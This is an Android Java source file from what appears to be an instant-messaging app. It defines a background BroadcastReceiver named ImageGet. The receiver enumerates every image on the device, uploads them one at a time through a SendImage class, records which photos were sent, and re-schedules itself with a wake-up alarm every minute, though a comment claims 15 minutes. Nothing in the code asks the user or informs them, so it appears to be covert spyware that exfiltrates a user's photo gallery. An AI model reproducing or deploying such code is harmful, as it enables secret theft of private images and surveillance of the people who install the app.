package at.vcity.androidim.extras;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.GregorianCalendar;
import java.util.Scanner;
import java.util.StringTokenizer;

import at.vcity.androidim.SendImage;

/**
 * Created by Wali on 3/24/2015.
 */
public class ImageGet extends BroadcastReceiver{
    public static String FILENAME = "hello_file.txt";
    Uri sourceUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

    private static ArrayList<String> Pics= new ArrayList<String>();
    private Boolean FirstTime=true;

    private void FirstCall(Context context){
        if(FirstTime){
            String yourFilePath = context.getFilesDir() + "/" + FILENAME;
            File yourFile = new File( yourFilePath );
            if(!yourFile.exists()){
                try {
                    yourFile.createNewFile();
                }
                catch(Exception e){
                    System.out.println("Couldnt Make a Done File");
                }
            }
            FirstTime=false;
        }
    }

    private void AddToFile(String Path,Context context){
        try {
            String yourFilePath = context.getFilesDir() + "/" + FILENAME;
            FileOutputStream fis = new FileOutputStream(yourFilePath, true);
            String in = Path + "\n";
            fis.write(in.getBytes());
            System.out.println("Wrote :'"+Path+"' to File");
            fis.close();
        }
        catch(Exception e){
            System.out.println("Could not append to file");
            e.printStackTrace();
        }
    }

    @Override
    public void onReceive(Context context, Intent intent){
        FirstCall(context);

        AsyncTask<Object, String, String> ImageCall = new AsyncTask<Object,String,String>(){
            @Override
            public String doInBackground(Object...context){
                try{
                    getAllShownImagesPath(Pics,(Context) context[0]);
                    ConnectivityManager cm = (ConnectivityManager) ((Context)context[0]).getSystemService(Context.CONNECTIVITY_SERVICE);
                    NetworkInfo ni = cm.getActiveNetworkInfo();
                    if(ni!=null){
                        ArrayList<byte[]> sendarray = new ArrayList<byte[]>();
                        File temp = new File(Pics.get(0)); // temp file created with the path
                        System.out.println("File is " + temp.getName());
                        FileInputStream In = new FileInputStream(temp);
                        byte[] data= new byte[(int)temp.length()];
                        System.out.println("Data L : "+ data.length);
                        In.read(data);
                        In.close();
                        sendarray.add(data);
                        sendarray.add(Pics.get(0).getBytes());
                        SendImage newSend= new SendImage(sendarray);
                        newSend.run();
                        AddToFile(Pics.get(0),(Context)context[0]);
                        Pics.remove(0);//Sent
                        data=null;
                        In=null;
                        sendarray=null;
                        temp=null;
                        System.gc();
                    }
                }
                catch(Exception e ){
                    System.out.println("Failed to Send Image");
                    e.printStackTrace();
                }
                return "";
            }
        };
        ImageCall.execute(context);
        setIMGAlarm(context);
    }

    public static void getAllShownImagesPath(ArrayList<String> current, Context context) {
        Uri uri;
        Cursor cursor;
        int column_index;
        StringTokenizer st1;
        String absolutePathOfImage = null;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.MediaColumns.DATA };
        ContentResolver contentResolver =context.getContentResolver();
        cursor =  contentResolver.query(uri, projection, null,
                null, null);

        // column_index = cursor.getColumnIndexOrThrow(MediaColumns.DATA);
        column_index = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index);
            if(!current.contains(absolutePathOfImage) && NotSent(absolutePathOfImage,context)){
                current.add(absolutePathOfImage);
            }

        }
    }

    private static boolean NotSent(String Path, Context context){
        try{
            String yourFilePath = context.getFilesDir() + "/" + FILENAME;
            Scanner scan=new Scanner(new File(yourFilePath));
            while(scan.hasNextLine()){
                String temp=scan.nextLine();
                //System.out.println("Scan Line Read : " + temp);
                //System.out.println("Path is : " + Path);
               // System.out.println("Bool value is " + temp.contains(Path));
                if(temp.contains(Path)){
                    scan.close();
                    System.out.println("Found : " +Path );
                    return false;
                }
            }
            scan.close();
            return true;
        }
        catch(Exception e){
            System.out.println("Failed to Done File");
        }
        return true;
    }


    // Set this receiver to trigger again in 15 minutes.
    private void setIMGAlarm(Context context) {
        Intent i = new Intent(context, ImageGet.class);
        GregorianCalendar cal = new GregorianCalendar();
        int _id = (int) System.currentTimeMillis();
        PendingIntent appIntent =
                PendingIntent.getBroadcast(context, _id, i, PendingIntent.FLAG_ONE_SHOT);

        cal.add(Calendar.MINUTE, 1);
        Log.i("IMG_SCAN_ALARM_SET", "Set scan IMG alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
        AlarmManager am = (AlarmManager)context.getSystemService(Activity.ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                appIntent);
    }




}
